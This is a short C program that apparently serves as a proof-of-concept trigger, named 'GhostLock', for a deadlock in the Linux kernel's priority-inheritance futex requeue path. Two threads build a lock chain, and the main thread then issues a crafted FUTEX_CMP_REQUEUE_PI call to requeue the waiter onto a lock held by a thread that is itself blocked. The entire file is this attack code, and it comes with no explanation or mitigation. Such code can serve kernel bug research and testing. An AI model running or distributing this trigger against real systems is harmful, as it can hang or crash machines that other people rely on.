#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <stdatomic.h>

static int f_wait, f_pi_target, f_pi_chain;
static atomic_int a_ready, a_waiting, b_started, done;
static long waiter_ret, trigger_ret;

static long futex_call(int *uaddr, int op, int val, const struct timespec *ts, int *uaddr2, int val3) {
    return syscall(SYS_futex, uaddr, op | FUTEX_PRIVATE_FLAG, val, ts, uaddr2, val3);
}

static void *waiter_thread(void *arg) {
    (void)arg;
    futex_call(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&a_ready, 1);
    usleep(20000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += 50000000;
    if (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    atomic_store(&a_waiting, 1);
    errno = 0;
    waiter_ret = futex_call(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("waiter ret=%ld errno=%d (%s)\n", waiter_ret, errno, strerror(errno));
    atomic_store(&done, 1);
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    futex_call(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&a_ready)) usleep(1000);
    atomic_store(&b_started, 1);
    futex_call(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("owner unexpectedly acquired chain\n");
    return NULL;
}

int main(void) {
    printf("GhostLock three-thread deadlock trigger start\n");
    f_wait = f_pi_target = f_pi_chain = 0;
    pthread_t w, o;
    pthread_create(&o, NULL, owner_thread, NULL);
    pthread_create(&w, NULL, waiter_thread, NULL);
    while (!atomic_load(&a_waiting) || !atomic_load(&b_started)) usleep(1000);
    usleep(20000);
    errno = 0;
    trigger_ret = futex_call(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (const struct timespec*)1, &f_pi_target, 0);
    printf("trigger ret=%ld errno=%d (%s)\n", trigger_ret, errno, strerror(errno));
    sleep(1);
    printf("done waiter_ret=%ld trigger_ret=%ld\n", waiter_ret, trigger_ret);
    return 0;
}
